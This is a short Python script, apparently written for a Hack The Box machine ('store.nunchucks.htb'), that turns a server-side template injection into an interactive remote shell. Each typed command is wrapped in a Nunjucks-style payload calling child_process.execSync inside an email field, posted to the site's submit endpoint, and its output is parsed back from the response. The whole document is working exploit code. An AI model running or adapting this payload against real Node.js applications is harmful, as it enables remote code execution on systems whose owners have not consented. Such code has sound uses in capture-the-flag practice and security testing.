#!/usr/bin/python
import requests
import re
import json

print('***** Enter qq to exit.')

while True:
    input1 = input("***** Enter Command to run:  ")
    command = input1
    if "qq" in command:
        print('quitting ...')
        break
    else:
        try:
            # create a session object
            s = requests.Session()
            payload = command
            data = {"email":"AAA{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('" + payload + "')\")()}}AAA@example.com"
            }
            grabbed_regex = re.search(r"AAA(.*)AAA", data['email'], flags=re.S|re.M)
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://store.nunchucks.htb"
            }
            # make a POST request
            req = s.post('https://store.nunchucks.htb/api/submit',json = data, headers = headers, verify = False)
            res = req.json()
            text = json.dumps(res)
            # print(text)  prints whole response before cutting out the command output
            returned_command = re.search(r"AAA(.*)AAA", text, flags=re.S|re.M)
            print("\n" + returned_command.group(1).replace(r'\n', '\n'))
        except Exception as e:
            print("error: " + str(e))
